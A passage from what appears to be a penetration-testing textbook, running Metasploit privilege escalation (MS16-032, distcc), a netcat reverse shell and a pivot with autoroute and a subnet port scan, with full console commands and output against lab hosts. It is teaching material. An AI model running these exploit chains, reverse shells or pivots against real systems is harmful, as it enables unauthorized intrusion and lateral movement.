
command once you’ve backgrounded the Meterpreter session you were in. This is a parameter you will need to set, as well as setting the payload and the local host and port required for the reverse Meterpreter shell. You can see setting all the necessary variables and then starting up the exploit.

## Using Local Exploit from Metasploit

```
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set SESSION 2
SESSION => 2
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set LHOST 192.168.86.57
LHOST => 192.168.86.57
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set LPORT 4445
LPORT => 4445
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > exploit

[*] Started reverse TCP handler on 192.168.86.57:4445
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
[*] Writing payload file, C:\ManageEngine\DesktopCentral_Server\bin\ROayyKQ.txt...
[*] Compressing script contents...
[+] Compressed size: 3621
[*] Executing exploit script...
```

In some cases, we can’t make use of Metasploit. We need to make use of some external tools. This may mean compiling an exploit program. In the next code listing, you will see compromising a Linux system using a vulnerability on a distributed C compiler daemon. This makes use of a Metasploit module to perform the initial exploit. The privilege escalation requires a C program to be compiled so it runs on the target system. Since we can’t guarantee there is a C compiler, the program is compiled on the attack system. Our target is 32-bit, while our attack system is 64-bit. This means we need to have a special set of libraries so we can cross-compile from one target architecture to another. Once we have the output, though, we can put it and a simple shell script into the directory, where it will be available from a web server. In this listing, you will see exploiting the target system and then running the privilege escalation.

## Linux Privilege Escalation

```
msf > use exploit/unix/misc/distcc_exec
msf exploit(unix/misc/distcc_exec) > set RHOST 192.168.86.66
RHOST => 192.168.86.66
msf exploit(unix/misc/distcc_exec) > exploit

[*] Started reverse TCP double handler on 192.168.86.57:4444
[*] Accepted the first client connection...
[*] Accepted the second client connection...
```

```
[*] Command: echo 9LVs5a2CaAEk29pj;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "9LVs5a2CaAEk29pj\\r\\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (192.168.86.57:4444 -> 192.168.86.66:47936)
at 2018-09-09 18:28:22 -0600
```

```
whoami
daemon
cd /tmp
ps auxwww | grep udev
root      2663  0.0  0.1  2216  700 ?        S<s  Apr24   0:00 /sbin/udevd
--daemon
daemon    6364  0.0  0.1  1784  532 ?        RN   11:54   0:00 grep udev
./escalate 2662
```

What you don't see here is downloading the two files needed. One of them is the exploit itself, named escalate. The other is a simple shell script named run. What it does is use netcat to send a shell back to our target system. In the next code listing, you can see the reverse connection on our attack system. We get the reverse connection by using netcat to open a listening port. The port used as the listening port matches the port used in the shell script. In the privilege escalation attack, we provide a number one less than the process identification number from the udev process. This is what triggers the exploit.

## Listening for reverse connection with netcat

```
root@quiche:~# netcat -lvp 5555
listening on [any] 5555 ...
192.168.86.66: inverse host lookup failed: Unknown host
connect to [192.168.86.57] from (UNKNOWN) [192.168.86.66] 50391
whoami
root
uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
GNU/Linux
```

This sort of exploit chaining is often required for getting the access that is necessary. Of course, gaining administrative access isn't all you're looking to do, though it's certainly useful. You may also want to use the foothold you have to start looking at additional systems on the network.

## Pivoting

Some organizations have a flat network design, meaning systems are all connected to a single network rather than multiple networks allowing tiered access. However, organizations that are concerned with security of critical resources will probably have systems connected to multiple systems. You may find after compromising a system that it has multiple interfaces, such as the system you can see in the following code listing. The system in question is a Windows system and it has two interfaces. One is on the 192.168.86.0 network, which is the interface on which the exploit came in. The other interface, named Interface 19 in the listing, is on the 172.30.42.0 network. This is the network we are going to want to target, but we can’t just upload a bunch of attack tools to the compromised system. Instead, we need to be able to pass traffic from our attack system through the compromised system and into the network it is connected to.

## IP Address Configuration

```
meterpreter > getuid
Server username: NT AUTHORITY\LOCAL SERVICE
meterpreter > ipconfig

Interface 1
============
Name : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff

Interface 12
============
Name : Microsoft ISATAP Adapter
Hardware MAC : 00:00:00:00:00:00
MTU : 1280
IPv6 Address : fe80::5efe:c0a8:5621
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
```

```
Interface 13
==========

Name             : Intel(R) PRO/1000 MT Network Connection
Hardware MAC     : 1e:25:07:dc:7c:6e
MTU              : 1500
IPv4 Address     : 192.168.86.33
IPv4 Netmask     : 255.255.255.0
IPv6 Address     : fe80::35b1:1874:3712:8b59
IPv6 Netmask     : ffff:ffff:ffff:ffff::
```

```
Interface 19
============

Name             : Intel(R) PRO/1000 MT Network Connection #2
Hardware MAC     : 42:39:bd:ec:24:40
MTU              : 1500
IPv4 Address     : 172.30.42.50
IPv4 Netmask     : 255.255.255.0
IPv6 Address     : fe80::4b4:7b9a:b3b7:3742
IPv6 Netmask     : ffff:ffff:ffff:ffff::
```

To add the route we need to pass traffic to the 172.30.42.0 subnet, we need to run a post-exploit module. The module we are going to run is called autoroute, and it will take care of adding the route to that network by way of the session we have open. In the following listing, you can see running the autoroute module. You’ll see the output indicating that the route has been added as a result of running the module.

## Running Autoroute

```
meterpreter > run post/multi/manage/autoroute SUBNET=172.30.42.0 ACTION=ADD

[!] SESSION may not be compatible with this module.
[*] Running module against VAGRANT-2008R2
[*] Adding a route to 172.30.42.0/255.255.255.0...
[+] Route added to subnet 172.30.42.0/255.255.255.0.
```

Now that the route is in place, we want to make use of it. We can background the Meterpreter session at this point and run any module we choose against that network. For example, it wouldn’t be unusual to run a port scan against that network. In the following code, you can see the routing table being checked from outside of Meterpreter after the session is backgrounded (you can put Meterpreter into the background by using either the background command or typing Ctrl+Z). The routing table shows that we have a route to the 172.30.42.0 network through Session 1, which is the Meterpreter session we have open. Below that, the port scan module gets loaded up to run against that network.

```
msf exploit(windows/http/manageengine_connectionid_write) > route print
```

IPv4 Active Routing Table

| Subnet | Netmask | Gateway |
| :--- | :--- | :--- |
| 172.30.42.0 | 255.255.255.0 | Session 1 |

[*] There are currently no IPv6 routes defined.

```
msf exploit(windows/http/manageengine_connectionid_write) >
```

```
msf exploit(windows/http/manageengine_connectionid_write) > use auxiliary/scanner/portscan/tcp
```

```
msf auxiliary(scanner/portscan/tcp) > set RHOSTS 172.30.42.0/24
```

```
RHOSTS => 172.30.42.0/24
```

```
msf auxiliary(scanner/portscan/tcp) > run
```

Once you have an idea of what other systems are on the other network, you can start looking for vulnerabilities on those systems. Pivoting is all about taking one compromised system and using it to gain access to other systems, that is, pivot to those systems. Once you have your network routes in place, you are in good shape to accomplish that pivoting so you can extend your reach into the network.

## Persistence

Gaining access is important because it demonstrates that you can compromise systems and gain access to sensitive information. This is a good way to show the organization you are working with where some of their issues may be. However, attackers don't want to have to keep exploiting the same vulnerability each time they want access to the system. For a start, it's time-consuming. Second, if the attacker, even if it's a faux-attacker (meaning you), is exploiting a vulnerability, they can't be sure that the vulnerability won't be patched. This means they may not be able to get in later on. Gathering information probably isn't a one-and-done situation. Of course, in an enterprise environment, data is constantly changing. No matter what the objective of the attacker is, they will generally want to maintain access to compromised systems.

The process of maintaining access is called persistence. Access to the system is persisting over time and, ideally, across reboots of the system. No matter what happens, ideally,
